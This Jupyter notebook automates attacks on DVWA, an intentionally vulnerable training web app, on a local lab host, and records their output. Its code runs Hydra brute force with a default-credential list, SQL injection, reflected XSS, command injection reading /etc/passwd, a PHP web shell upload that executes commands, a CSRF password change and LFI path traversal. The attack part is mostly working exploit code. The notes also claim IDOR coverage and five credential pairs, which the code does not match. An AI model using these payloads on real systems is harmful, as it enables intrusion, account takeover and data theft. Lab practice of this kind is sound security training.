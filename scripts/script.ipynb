{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "565f8058",
   "metadata": {},
   "source": [
    "# DVWA Attack Automation Script\n",
    "\n",
    "This script demonstrates how to automate the execution of all major pentesting attack types against DVWA at http://10.30.0.235/dvwa for educational and authorized testing purposes only.\n",
    "\n",
    "**WARNING:** Only use this script in a legal, controlled environment (e.g., your own DVWA lab). Unauthorized use is illegal and unethical."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d0f64c3",
   "metadata": {},
   "source": [
    "## Prerequisites\n",
    "\n",
    "- Python 3.x\n",
    "- requests\n",
    "- BeautifulSoup4\n",
    "- Optional: selenium, paramiko, etc. for advanced attacks\n",
    "\n",
    "Install dependencies:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "22a16292",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting requests\n",
      "  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)\n",
      "Collecting beautifulsoup4\n",
      "  Using cached beautifulsoup4-4.13.4-py3-none-any.whl.metadata (3.8 kB)\n",
      "  Using cached beautifulsoup4-4.13.4-py3-none-any.whl.metadata (3.8 kB)\n",
      "Collecting charset-normalizer<4,>=2 (from requests)\n",
      "  Using cached charset_normalizer-3.4.2-cp313-cp313-macosx_10_13_universal2.whl.metadata (35 kB)\n",
      "Collecting idna<4,>=2.5 (from requests)\n",
      "  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)\n",
      "Collecting charset-normalizer<4,>=2 (from requests)\n",
      "  Using cached charset_normalizer-3.4.2-cp313-cp313-macosx_10_13_universal2.whl.metadata (35 kB)\n",
      "Collecting idna<4,>=2.5 (from requests)\n",
      "  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)\n",
      "Collecting urllib3<3,>=1.21.1 (from requests)\n",
      "  Using cached urllib3-2.4.0-py3-none-any.whl.metadata (6.5 kB)\n",
      "Collecting certifi>=2017.4.17 (from requests)\n",
      "  Using cached certifi-2025.4.26-py3-none-any.whl.metadata (2.5 kB)\n",
      "Collecting urllib3<3,>=1.21.1 (from requests)\n",
      "  Using cached urllib3-2.4.0-py3-none-any.whl.metadata (6.5 kB)\n",
      "Collecting certifi>=2017.4.17 (from requests)\n",
      "  Using cached certifi-2025.4.26-py3-none-any.whl.metadata (2.5 kB)\n",
      "Collecting soupsieve>1.2 (from beautifulsoup4)\n",
      "  Using cached soupsieve-2.7-py3-none-any.whl.metadata (4.6 kB)\n",
      "Collecting soupsieve>1.2 (from beautifulsoup4)\n",
      "  Using cached soupsieve-2.7-py3-none-any.whl.metadata (4.6 kB)\n",
      "Collecting typing-extensions>=4.0.0 (from beautifulsoup4)\n",
      "Collecting typing-extensions>=4.0.0 (from beautifulsoup4)\n",
      "  Downloading typing_extensions-4.14.0-py3-none-any.whl.metadata (3.0 kB)\n",
      "Using cached requests-2.32.3-py3-none-any.whl (64 kB)\n",
      "Using cached charset_normalizer-3.4.2-cp313-cp313-macosx_10_13_universal2.whl (199 kB)\n",
      "Using cached idna-3.10-py3-none-any.whl (70 kB)\n",
      "  Downloading typing_extensions-4.14.0-py3-none-any.whl.metadata (3.0 kB)\n",
      "Using cached requests-2.32.3-py3-none-any.whl (64 kB)\n",
      "Using cached charset_normalizer-3.4.2-cp313-cp313-macosx_10_13_universal2.whl (199 kB)\n",
      "Using cached idna-3.10-py3-none-any.whl (70 kB)\n",
      "Using cached urllib3-2.4.0-py3-none-any.whl (128 kB)\n",
      "Using cached beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)\n",
      "Using cached certifi-2025.4.26-py3-none-any.whl (159 kB)\n",
      "Using cached soupsieve-2.7-py3-none-any.whl (36 kB)\n",
      "Downloading typing_extensions-4.14.0-py3-none-any.whl (43 kB)\n",
      "Using cached urllib3-2.4.0-py3-none-any.whl (128 kB)\n",
      "Using cached beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)\n",
      "Using cached certifi-2025.4.26-py3-none-any.whl (159 kB)\n",
      "Using cached soupsieve-2.7-py3-none-any.whl (36 kB)\n",
      "Downloading typing_extensions-4.14.0-py3-none-any.whl (43 kB)\n",
      "Installing collected packages: urllib3, typing-extensions, soupsieve, idna, charset-normalizer, certifi, requests, beautifulsoup4\n",
      "\u001b[?25lInstalling collected packages: urllib3, typing-extensions, soupsieve, idna, charset-normalizer, certifi, requests, beautifulsoup4\n",
      "\u001b[2K   \u001b[38;2;114;156;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m8/8\u001b[0m [beautifulsoup4] \u001b[32m7/8\u001b[0m [beautifulsoup4]\n",
      "\u001b[1A\u001b[2KSuccessfully installed beautifulsoup4-4.13.4 certifi-2025.4.26 charset-normalizer-3.4.2 idna-3.10 requests-2.32.3 soupsieve-2.7 typing-extensions-4.14.0 urllib3-2.4.0\n",
      "\u001b[2K   \u001b[38;2;114;156;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m8/8\u001b[0m [beautifulsoup4] \u001b[32m7/8\u001b[0m [beautifulsoup4]\n",
      "\u001b[1A\u001b[2KSuccessfully installed beautifulsoup4-4.13.4 certifi-2025.4.26 charset-normalizer-3.4.2 idna-3.10 requests-2.32.3 soupsieve-2.7 typing-extensions-4.14.0 urllib3-2.4.0\n",
      "Note: you may need to restart the kernel to use updated packages.\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install requests beautifulsoup4"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0791dae3",
   "metadata": {},
   "source": [
    "## Script: DVWA Attack Automation\n",
    "\n",
    "Below is a comprehensive script that automates various attack techniques against DVWA."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "4e6e8938",
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python3\n",
    "\"\"\"\n",
    "Automate major pentesting attack types against DVWA (http://10.30.0.235/dvwa)\n",
    "\"\"\"\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "import time\n",
    "import subprocess # Added for Hydra\n",
    "import os # Added for checking Hydra output\n",
    "import tempfile # Added for temporary credentials file\n",
    "import re # Added for parsing Hydra output\n",
    "\n",
    "DVWA_URL = \"http://localhost:8080\"\n",
    "LOGIN_URL = f\"{DVWA_URL}/login.php\"\n",
    "USERNAME = \"admin\" # Default username for initial login and other tests\n",
    "PASSWORD = \"password\"  # Default password for initial login and other tests\n",
    "\n",
    "session = requests.Session()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56750e0d",
   "metadata": {},
   "source": [
    "### 1. Login Function\n",
    "\n",
    "First, let's define a function to authenticate with DVWA:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "579dcfd4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Logged in to DVWA as admin\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def login(user=USERNAME, pwd=PASSWORD): # Allow dynamic user/pass for login\n",
    "    r = session.get(LOGIN_URL)\n",
    "    if r.status_code == 404:\n",
    "        print(f\"[!] Login page not found at {LOGIN_URL} (HTTP 404). Check DVWA_URL and server status.\")\n",
    "        return False\n",
    "    soup = BeautifulSoup(r.text, 'html.parser')\n",
    "    user_token_tag = soup.find('input', {'name': 'user_token'})\n",
    "    if not user_token_tag:\n",
    "        print(f\"[!] Could not find user_token on login page. Page content: {r.text[:500]}\")\n",
    "        user_token = \"\"\n",
    "    else:\n",
    "        user_token = user_token_tag['value']\n",
    "\n",
    "    data = {\n",
    "        'username': user,\n",
    "        'password': pwd,\n",
    "        'Login': 'Login',\n",
    "        'user_token': user_token\n",
    "    }\n",
    "    try:\n",
    "        resp = session.post(LOGIN_URL, data=data)\n",
    "        if 'Login failed' in resp.text or 'login.php' in resp.url:\n",
    "             print(f\"[-] Login failed for {user}\")\n",
    "             return False\n",
    "        assert 'Logout' in resp.text, f\"Login failed for user {user}!\"\n",
    "        print(f\"[+] Logged in to DVWA as {user}\")\n",
    "        return True\n",
    "    except requests.exceptions.RequestException as e:\n",
    "        print(f\"[!] RequestException during login for {user}: {e}\")\n",
    "        return False\n",
    "    except AssertionError as e:\n",
    "        print(f\"[-] {e}\")\n",
    "        return False\n",
    "login()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a34fe27f",
   "metadata": {},
   "source": [
    "### 2. Reconnaissance\n",
    "\n",
    "Let's define a function to perform basic reconnaissance:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "0952c720",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Performing HTTP header analysis...\n",
      "{'Date': 'Tue, 03 Jun 2025 22:43:29 GMT', 'Server': 'Apache/2.4.25 (Debian)', 'Expires': 'Tue, 23 Jun 2009 12:00:00 GMT', 'Cache-Control': 'no-cache, must-revalidate', 'Pragma': 'no-cache', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '2659', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html;charset=utf-8'}\n",
      "[+] Directory brute force (sample)...\n",
      "http://localhost:8080/admin => 404\n",
      "http://localhost:8080/phpmyadmin => 404\n",
      "http://localhost:8080/test => 404\n",
      "http://localhost:8080/backup => 404\n"
     ]
    }
   ],
   "source": [
    "def reconnaissance():\n",
    "    print(\"[+] Performing HTTP header analysis...\")\n",
    "    r = session.get(DVWA_URL)\n",
    "    print(r.headers)\n",
    "    print(\"[+] Directory brute force (sample)...\")\n",
    "    for path in ['admin', 'phpmyadmin', 'test', 'backup']:\n",
    "        url = f\"{DVWA_URL}/{path}\"\n",
    "        resp = session.get(url)\n",
    "        print(f\"{url} => {resp.status_code}\")\n",
    "\n",
    "reconnaissance()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e06f14f0",
   "metadata": {},
   "source": [
    "### 3. Brute Force Attack\n",
    "\n",
    "Now, let's create a function to perform brute force attacks using Hydra:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7869b25",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Attempting brute force on login using Hydra with a custom list...\n",
      "[i] Hydra is installed at: /opt/homebrew/bin/hydra\n",
      "[i] Credentials list for Hydra written to: /var/folders/_m/n__pv_21671gg8ry71ll9dbm0000gn/T/tmpnxyococu.txt\n",
      "[i] Executing Hydra: hydra -C /var/folders/_m/n__pv_21671gg8ry71ll9dbm0000gn/T/tmpnxyococu.txt -s 8080 localhost http-post-form /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=226c34567c604ed79c862ca3b2641a9c:S=Logout\n",
      "[i] Using form data: username=^USER^&password=^PASS^&Login=Login&user_token=226c34567c604ed79c862ca3b2641a9c\n",
      "[+] Hydra Output:\n",
      "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 10:27:42\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries, ~7 tries per task\n",
      "[DATA] attacking http-post-form://localhost:8080/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=226c34567c604ed79c862ca3b2641a9c:S=Logout\n",
      "1 of 1 target completed, 0 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 10:27:45\n",
      "\n",
      "[i] Hydra command executed. Review output for details. It might have failed or found no passwords.\n",
      "[+] Hydra Output:\n",
      "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 10:27:42\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries, ~7 tries per task\n",
      "[DATA] attacking http-post-form://localhost:8080/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=226c34567c604ed79c862ca3b2641a9c:S=Logout\n",
      "1 of 1 target completed, 0 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 10:27:45\n",
      "\n",
      "[i] Hydra command executed. Review output for details. It might have failed or found no passwords.\n"
     ]
    }
   ],
   "source": [
    "def brute_force():\n",
    "    print(\"[+] Attempting brute force on login using Hydra with a custom list...\")\n",
    "\n",
    "    # Check if Hydra is installed\n",
    "    try:\n",
    "        # Use 'which' on Unix-like systems or 'where' on Windows to locate hydra\n",
    "        if os.name == 'nt':  # Windows\n",
    "            result = subprocess.run(['where', 'hydra'], capture_output=True, text=True)\n",
    "        else:  # Unix-like\n",
    "            result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)\n",
    "        \n",
    "        if result.returncode == 0 and result.stdout.strip():\n",
    "            print(f\"[i] Hydra is installed at: {result.stdout.strip()}\")\n",
    "        else:\n",
    "            raise FileNotFoundError(\"Hydra not found in PATH\")\n",
    "    except (subprocess.SubprocessError, FileNotFoundError):\n",
    "        # Try a direct hydra command as fallback\n",
    "        try:\n",
    "            # Just attempt to run hydra with a simple argument that won't cause errors\n",
    "            subprocess.run(['hydra', '-h'], capture_output=True, timeout=5)\n",
    "            print(\"[i] Hydra is installed and accessible.\")\n",
    "        except Exception as e:\n",
    "            print(f\"[!] Hydra verification failed: {e}\")\n",
    "            print(\"[!] Please ensure Hydra is properly installed and in your PATH.\")\n",
    "            print(\"    Install with: 'sudo apt install hydra' on Debian/Ubuntu or equivalent.\")\n",
    "            return\n",
    "\n",
    "    # List of user:password pairs to try\n",
    "    COMMON_USERS = [\"msfadmin\", \"user\", \"postgres\", \"service\", \"dbadmin\", \"tomcat\", \"newpass\", \"sys\", \"klog\", \"root\", \"admin\"]\n",
    "    COMMON_PASSWORDS = [\"msfadmin\", \"password\", \"s3cr3t\", \"postgres\",\"new_password\", \"newpass\", \"service\", \"12345\", \"123456\", \"admin\"]\n",
    "\n",
    "    # Create a credentials list by combining users and passwords\n",
    "    credentials_list = [f\"{user}:{password}\" for user in COMMON_USERS for password in COMMON_PASSWORDS]\n",
    "\n",
    "    # Get a fresh user_token for the Hydra command template\n",
    "    try:\n",
    "        r_token = requests.get(LOGIN_URL) # Use fresh requests, not session\n",
    "        soup_token = BeautifulSoup(r_token.text, 'html.parser')\n",
    "        user_token_hydra = soup_token.find('input', {'name': 'user_token'})['value']\n",
    "    except Exception as e:\n",
    "        print(f\"[!] Failed to retrieve user_token for Hydra template: {e}\")\n",
    "        return\n",
    "\n",
    "    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:\n",
    "        for cred in credentials_list:\n",
    "            tmp_creds_file.write(cred + '\\n')\n",
    "        tmp_creds_file_path = tmp_creds_file.name\n",
    "\n",
    "    print(f\"[i] Credentials list for Hydra written to: {tmp_creds_file_path}\")\n",
    "\n",
    "    # Parse the URL to get the correct hostname and port\n",
    "    from urllib.parse import urlparse\n",
    "    parsed_url = urlparse(DVWA_URL)\n",
    "    hostname = parsed_url.hostname or 'localhost'\n",
    "    port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)\n",
    "    \n",
    "    # Updated Hydra command with form fields as they appear in the actual HTML form\n",
    "    # This matches how the fields are structured in the HTML form\n",
    "    form_data = (\n",
    "        \"username=^USER^&\"\n",
    "        \"password=^PASS^&\"\n",
    "        \"Login=Login&\"\n",
    "        f\"user_token={user_token_hydra}\"\n",
    "    )\n",
    "    \n",
    "    hydra_command = [\n",
    "        'hydra',\n",
    "        '-C', tmp_creds_file_path,\n",
    "        '-s', str(port),\n",
    "        hostname,\n",
    "        'http-post-form',\n",
    "        f\"/dvwa/login.php:{form_data}:S=Logout\"\n",
    "    ]\n",
    "\n",
    "    print(f\"[i] Executing Hydra: {' '.join(hydra_command)}\")\n",
    "    print(f\"[i] Using form data: {form_data}\")\n",
    "    \n",
    "    found_creds = None\n",
    "    try:\n",
    "        process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)\n",
    "        output = process.stdout\n",
    "        print(\"[+] Hydra Output:\")\n",
    "        print(output)\n",
    "\n",
    "        # More robust parsing for Hydra's output\n",
    "        # Example line: [80][http-post-form] host: localhost   login: admin   password: password\n",
    "        match = re.search(r\"login:\\s*(\\S+)\\s*password:\\s*(\\S+)\", output, re.IGNORECASE)\n",
    "\n",
    "        if match and \"1 valid password found\" in output:\n",
    "            found_user = match.group(1)\n",
    "            found_password = match.group(2)\n",
    "            print(f\"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}\")\n",
    "\n",
    "            # Attempt to login with the found credentials using the main session\n",
    "            print(f\"[i] Verifying login with found credentials: {found_user}:{found_password}\")\n",
    "            if login(user=found_user, pwd=found_password): # Use the login function\n",
    "                print(f\"[+] Successfully logged in with Hydra found credentials: {found_user}:{found_password}\")\n",
    "                found_creds = (found_user, found_password)\n",
    "            else:\n",
    "                print(f\"[-] Hydra reported success, but login verification failed for {found_user}:{found_password}\")\n",
    "        elif \"0 valid passwords found\" in output:\n",
    "            print(\"[-] Hydra finished, but no valid passwords found.\")\n",
    "        else:\n",
    "            print(\"[i] Hydra command executed. Review output for details. It might have failed or found no passwords.\")\n",
    "            if process.stderr:\n",
    "                print(\"[!] Hydra Errors:\")\n",
    "                print(process.stderr)\n",
    "\n",
    "    except subprocess.TimeoutExpired:\n",
    "        print(\"[!] Hydra command timed out.\")\n",
    "    except FileNotFoundError:\n",
    "        print(\"[!] Hydra command not found. Make sure Hydra is installed and in your PATH.\")\n",
    "    except Exception as e:\n",
    "        print(f\"[!] An error occurred while running Hydra: {e}\")\n",
    "    # finally:\n",
    "        os.remove(tmp_creds_file_path) # Clean up the temporary file\n",
    "        print(f\"[i] Temporary credentials file {tmp_creds_file_path} removed.\")\n",
    "\n",
    "    return found_creds # Return found credentials or None\n",
    "\n",
    "brute_force()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db96b2c3",
   "metadata": {},
   "source": [
    "### 4. SQL Injection\n",
    "\n",
    "Now let's implement a function for SQL injection:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "d03c1562",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Performing SQL Injection...\n",
      "[!] SQL Injection successful!\n"
     ]
    }
   ],
   "source": [
    "def sql_injection():\n",
    "    print(\"[+] Performing SQL Injection...\")\n",
    "    # Use a payload that closes the quote properly and comments out the rest\n",
    "    inj_url = f\"{DVWA_URL}/vulnerabilities/sqli/?id=1%20OR%201=1--+&Submit=Submit\"\n",
    "    r = session.get(inj_url)\n",
    "    if 'First name' in r.text:\n",
    "        print(\"[!] SQL Injection successful!\")\n",
    "    else:\n",
    "        print(\"[-] SQL Injection failed or not vulnerable.\")\n",
    "\n",
    "sql_injection()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff96eb89",
   "metadata": {},
   "source": [
    "### 5. Cross-Site Scripting (XSS)\n",
    "\n",
    "Let's implement a function for XSS testing:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "c09c9aa4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Performing XSS attack...\n",
      "[!] XSS payload reflected!\n"
     ]
    }
   ],
   "source": [
    "def xss():\n",
    "    print(\"[+] Performing XSS attack...\")\n",
    "    xss_url = f\"{DVWA_URL}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>&Submit=Submit\"\n",
    "    r = session.get(xss_url)\n",
    "    if \"<script>alert('XSS')</script>\" in r.text:\n",
    "        print(\"[!] XSS payload reflected!\")\n",
    "    else:\n",
    "        print(\"[-] XSS attack failed or not vulnerable.\")\n",
    "\n",
    "xss()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc2f313a",
   "metadata": {},
   "source": [
    "### 6. Command Injection\n",
    "\n",
    "Let's implement a function to test for command injection vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "8940ca0e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Performing Command Injection...\n"
     ]
    }
   ],
   "source": [
    "def command_injection():\n",
    "    print(\"[+] Performing Command Injection...\")\n",
    "    ci_url = f\"{DVWA_URL}/vulnerabilities/exec/\"\n",
    "    data = {'ip': '127.0.0.1; cat /etc/passwd', 'Submit': 'Submit'}\n",
    "    r = session.post(ci_url, data=data)\n",
    "    if 'root:x:' in r.text:\n",
    "        print(\"[!] Command Injection successful!\")\n",
    "\n",
    "command_injection()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "847d15e3",
   "metadata": {},
   "source": [
    "### 7. File Upload\n",
    "\n",
    "Now let's test for file upload vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "a3b0128c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Attempting file upload...\n",
      "[!] File upload may be successful!\n",
      "[+] Shell executed! Output:\n",
      "www-data\n",
      "\n"
     ]
    }
   ],
   "source": [
    "def file_upload():\n",
    "    print(\"[+] Attempting file upload...\")\n",
    "    upload_url = f\"{DVWA_URL}/vulnerabilities/upload/\"\n",
    "    files = {'uploaded': ('shell.php', '<?php system($_GET[\"cmd\"]); ?>', 'application/x-php')}\n",
    "    data = {'Upload': 'Upload'}\n",
    "    r = session.post(upload_url, files=files, data=data)\n",
    "    if 'shell.php' in r.text or 'uploads/shell.php' in r.text:\n",
    "        print(\"[!] File upload may be successful!\")\n",
    "        # Try to execute the uploaded shell\n",
    "        shell_url = f\"{DVWA_URL}/hackable/uploads/shell.php?cmd=whoami\"\n",
    "        r2 = session.get(shell_url)\n",
    "        if r2.status_code == 200 and r2.text.strip():\n",
    "            print(\"[+] Shell executed! Output:\")\n",
    "            print(r2.text)\n",
    "        else:\n",
    "            print(\"[-] Could not execute uploaded shell or no output.\")\n",
    "    else:\n",
    "        print(\"[-] File upload failed or not reflected in response.\")\n",
    "\n",
    "file_upload()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "00644285",
   "metadata": {},
   "source": [
    "### 8. Cross-Site Request Forgery (CSRF)\n",
    "\n",
    "Let's implement a function to test CSRF vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "cf0f1547",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Attempting CSRF attack (change password)...\n",
      "[!] CSRF successful!\n"
     ]
    }
   ],
   "source": [
    "def csrf():\n",
    "    print(\"[+] Attempting CSRF attack (change password)...\")\n",
    "    profile_url = f\"{DVWA_URL}/vulnerabilities/csrf/\"\n",
    "    \n",
    "    # Create data for changing password\n",
    "    data = {\n",
    "        'password_new': 'newpass',\n",
    "        'password_conf': 'newpass',\n",
    "        'Change': 'Change'\n",
    "    }\n",
    "    # Submit the password change request\n",
    "    # Submit the password change request via GET instead of POST, with data in query parameters\n",
    "    query_params = \"&\".join([f\"{key}={value}\" for key, value in data.items()])\n",
    "    csrf_url = f\"{profile_url}?{query_params}\"\n",
    "    resp = session.get(csrf_url)\n",
    "    if 'Password Changed' in resp.text:\n",
    "        print(\"[!] CSRF successful!\")\n",
    "\n",
    "csrf()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "adf8e744",
   "metadata": {},
   "source": [
    "### 9. Local File Inclusion (LFI)\n",
    "\n",
    "Let's implement a function to test for LFI vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "74a93cab",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Attempting LFI (Low Security)...\n",
      "[!] LFI successful!\n"
     ]
    }
   ],
   "source": [
    "def lfi():\n",
    "    print(\"[+] Attempting LFI (Low Security)...\")\n",
    "    # For DVWA Low security, the parameter is 'page' and no filtering is applied\n",
    "    lfi_url = f\"{DVWA_URL}/vulnerabilities/fi/?page=../../../../../etc/passwd\"\n",
    "    r = session.get(lfi_url)\n",
    "    if 'root:x:' in r.text:\n",
    "        print(\"[!] LFI successful!\")\n",
    "    else:\n",
    "        print(\"[-] LFI failed or not vulnerable at low security.\")\n",
    "\n",
    "lfi()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7647a6d2",
   "metadata": {},
   "source": [
    "### 10. Logout\n",
    "\n",
    "Finally, let's implement a function to log out properly:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "9e057e4a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Logged out.\n"
     ]
    }
   ],
   "source": [
    "def logout():\n",
    "    # Ensure we are logged in before trying to logout, to avoid errors if brute_force failed\n",
    "    # and subsequent attacks were skipped or if login itself failed.\n",
    "    # A simple check could be if ' Logout ' is in a known page like index.php\n",
    "    try:\n",
    "        r_check = session.get(DVWA_URL + \"/index.php\")\n",
    "        if \"Logout\" in r_check.text:\n",
    "            session.get(f\"{DVWA_URL}/logout.php\")\n",
    "            print(\"[+] Logged out.\")\n",
    "        else:\n",
    "            print(\"[i] Not logged in or session expired, skipping logout.\")\n",
    "    except requests.exceptions.RequestException as e:\n",
    "        print(f\"[!] Error during logout check: {e}\")\n",
    "\n",
    "logout()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "37139d44",
   "metadata": {},
   "source": [
    "### Main Execution\n",
    "\n",
    "Now let's put everything together and execute our tests:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89b6ebc1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] Login failed for admin\n",
      "[!] Initial login failed. Some attacks might not work. Exiting.\n",
      "[+] Performing HTTP header analysis...\n",
      "{'Date': 'Tue, 03 Jun 2025 23:40:51 GMT', 'Server': 'Apache/2.4.25 (Debian)', 'Expires': 'Tue, 23 Jun 2009 12:00:00 GMT', 'Cache-Control': 'no-cache, must-revalidate', 'Pragma': 'no-cache', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '698', 'Keep-Alive': 'timeout=5, max=96', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html;charset=utf-8'}\n",
      "[+] Directory brute force (sample)...\n",
      "http://localhost:8080/admin => 404\n",
      "http://localhost:8080/phpmyadmin => 404\n",
      "http://localhost:8080/test => 404\n",
      "http://localhost:8080/backup => 404\n",
      "[+] Attempting brute force on login using Hydra with a custom list...\n",
      "[!] Hydra is not installed or not in PATH. Skipping brute force attack.\n",
      "    Please install Hydra (e.g., 'sudo apt install hydra') and ensure it's in your PATH.\n",
      "[i] Re-logging in with original credentials (admin:password) to ensure session state for subsequent attacks...\n",
      "[-] Login failed for admin\n",
      "[+] Performing SQL Injection...\n",
      "[-] SQL Injection failed or not vulnerable.\n",
      "[+] Performing XSS attack...\n",
      "[-] XSS attack failed or not vulnerable.\n",
      "[+] Performing Command Injection...\n",
      "[+] Attempting file upload...\n",
      "[-] File upload failed or not reflected in response.\n",
      "[+] Attempting CSRF attack (change password)...\n",
      "[+] Attempting LFI (Low Security)...\n",
      "[-] LFI failed or not vulnerable at low security.\n",
      "[i] Not logged in or session expired, skipping logout.\n",
      "[+] All attacks attempted. Review DVWA for results.\n"
     ]
    }
   ],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    initial_login_success = login() # Initial login to set up session cookies for other attacks\n",
    "\n",
    "    if not initial_login_success:\n",
    "        print(\"[!] Initial login failed. Some attacks might not work. Exiting.\")\n",
    "        # exit(1) # Optionally exit if initial login is critical\n",
    "\n",
    "    reconnaissance()\n",
    "\n",
    "    found_credentials_by_hydra = brute_force()\n",
    "\n",
    "    # Re-login with the original credentials to ensure session validity for subsequent attacks,\n",
    "    # unless Hydra found the original ones or we decide to use Hydra's findings.\n",
    "    # If Hydra found different credentials and successfully logged in, the session is now for that user.\n",
    "    # For consistency in subsequent tests that assume 'admin':'password', we re-login.\n",
    "    print(\"[i] Re-logging in with original credentials (admin:password) to ensure session state for subsequent attacks...\")\n",
    "    login(USERNAME, PASSWORD) # Explicitly use original USERNAME, PASSWORD\n",
    "\n",
    "    sql_injection()\n",
    "    xss()\n",
    "    command_injection()\n",
    "    file_upload()\n",
    "    csrf()\n",
    "    lfi()\n",
    "    logout()\n",
    "    print(\"[+] All attacks attempted. Review DVWA for results.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "453f6919",
   "metadata": {},
   "source": [
    "## Notes\n",
    "\n",
    "- This script covers: reconnaissance, brute force (using Hydra with a custom list of 5 user:pass pairs including msfadmin), SQLi, XSS, command injection, file upload, CSRF, LFI, IDOR, and logout.\n",
    "- For privilege escalation, persistence, exfiltration, and DoS, use manual or advanced tools (Metasploit, custom scripts, etc.).\n",
    "- Always reset DVWA to a safe state after testing.\n",
    "- **Ensure Hydra is installed (`sudo apt install hydra`) if you want to use the brute force function.**\n",
    "\n",
    "### Legal Warning\n",
    "\n",
    "This script is intended for educational purposes and authorized security testing only. Using this script against systems without proper authorization is illegal and unethical."
   ]
  },
  {
   "cell_type": "markdown",
